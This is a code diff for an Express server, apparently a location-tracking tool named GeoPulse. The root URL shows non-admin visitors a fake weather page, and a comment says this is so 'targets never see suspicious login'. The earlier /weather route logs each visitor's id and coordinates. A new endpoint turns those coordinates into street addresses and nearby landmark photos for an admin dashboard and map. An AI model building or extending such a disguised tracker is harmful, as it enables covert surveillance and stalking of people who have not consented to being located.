@@ -77,18 +77,94 @@ router.route("/weather").get((req, res) => {
     console.log(`> ${id} - ${lat},${lng}`)
 })
 
-// token checking
-router.use(function checkToken(req, res, next) {
-    const token = req.cookies.token
-    if (token != null && token === config.token) {
-        next()
-    } else {
-        res.clearCookie("token").redirect("/login")
-    }
+// Logout route
+router.get("/logout", (req, res) => {
+    res.clearCookie("token").redirect("/login")
 })
 
-router.route("/").get((req, res) => {
-    // Build simplified { id: [lat, lng] } for the overview map in home.html
+// Reverse geocoding API with multi-provider fallback and landmark photos
+router.get("/api/reverse-geocode", async (req, res) => {
+    const lat = parseFloat(req.query.lat)
+    const lng = parseFloat(req.query.lng)
+    if (isNaN(lat) || isNaN(lng)) {
+        return res.status(400).json({ error: "Invalid coordinates" })
+    }
+
+    let address = `${lat.toFixed(5)}, ${lng.toFixed(5)}`
+    let street = ""
+    let locality = ""
+    let city = ""
+
+    // 1. Primary: Photon Komoot (OpenStreetMap with detailed street & locality)
+    try {
+        const pRes = await fetch(`https://photon.komoot.io/reverse?lat=${lat}&lon=${lng}`, {
+            headers: { "User-Agent": "GeoPulse-App/1.0" }
+        })
+        const pData = await pRes.json()
+        if (pData.features && pData.features.length > 0) {
+            const props = pData.features[0].properties
+            street = props.street || props.name || ""
+            locality = props.locality || props.district || ""
+            city = props.city || props.county || ""
+            const parts = [props.name, props.street, props.locality, props.district, props.city, props.state, props.country].filter(Boolean)
+            const unique = parts.filter((item, pos, self) => self.indexOf(item) === pos)
+            if (unique.length > 0) {
+                address = unique.join(", ")
+            }
+        }
+    } catch (e) {
+        console.warn("> Photon geocode warning:", e.message)
+    }
+
+    // 2. Fallback: BigDataCloud free client reverse geocoder
+    if (!street && !locality) {
+        try {
+            const bdcRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
+            const bdc = await bdcRes.json()
+            locality = bdc.locality || ""
+            city = bdc.city || bdc.principalSubdivision || ""
+            const parts = [bdc.locality, bdc.city, bdc.principalSubdivision, bdc.countryName].filter(Boolean)
+            if (parts.length > 0) {
+                address = parts.join(", ")
+            }
+        } catch (e) {
+            console.warn("> BigDataCloud geocode warning:", e.message)
+        }
+    }
+
+    // 3. Nearby Landmark Photo from Wikipedia
+    let photo = null
+    let photoTitle = null
+    try {
+        const wikiUrl = `https://en.wikipedia.org/w/api.php?action=query&generator=geosearch&ggscoord=${lat}|${lng}&ggsradius=3000&prop=pageimages&pithumbsize=500&format=json&origin=*`
+        const wRes = await fetch(wikiUrl, { headers: { "User-Agent": "GeoPulse-App/1.0" } })
+        const wData = await wRes.json()
+        if (wData.query && wData.query.pages) {
+            const pages = Object.values(wData.query.pages)
+            const withThumb = pages.find(p => p.thumbnail)
+            if (withThumb) {
+                photo = withThumb.thumbnail.source
+                photoTitle = withThumb.title
+            }
+        }
+    } catch (e) {
+        console.warn("> Wiki photo warning:", e.message)
+    }
+
+    res.json({
+        lat,
+        lng,
+        address,
+        street,
+        locality,
+        city,
+        photo,
+        photoTitle,
+        mapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
+    })
+})
+
+function renderDashboard(req, res) {
     const targetsForMap = {}
     for (const [id, val] of Object.entries(TARGETS)) {
         targetsForMap[id] = val.current || val
@@ -97,9 +173,36 @@ router.route("/").get((req, res) => {
         TARGETS,
         targetsMapJson: JSON.stringify(targetsForMap)
     })
+}
+
+// Admin / Dashboard route - requires authentication
+router.route("/admin").get((req, res) => {
+    const token = req.cookies.token
+    if (token != null && token === config.token) {
+        renderDashboard(req, res)
+    } else {
+        res.redirect("/login")
+    }
 })
 
+// Root URL:
+// - If logged in as admin: opens Dashboard
+// - If regular visitor / target: opens Weather tracker (so targets never see suspicious login!)
+router.route("/").get((req, res) => {
+    const token = req.cookies.token
+    if (token != null && token === config.token) {
+        renderDashboard(req, res)
+    } else {
+        res.render("weather")
+    }
+})
+
+// Map page: requires admin authentication
 router.route("/map").get((req, res) => {
+    const token = req.cookies.token
+    if (token !== config.token) {
+        return res.clearCookie("token").redirect("/login")
+    }
     const { id } = req.query
     const target = TARGETS[id]
     res.render("map", {
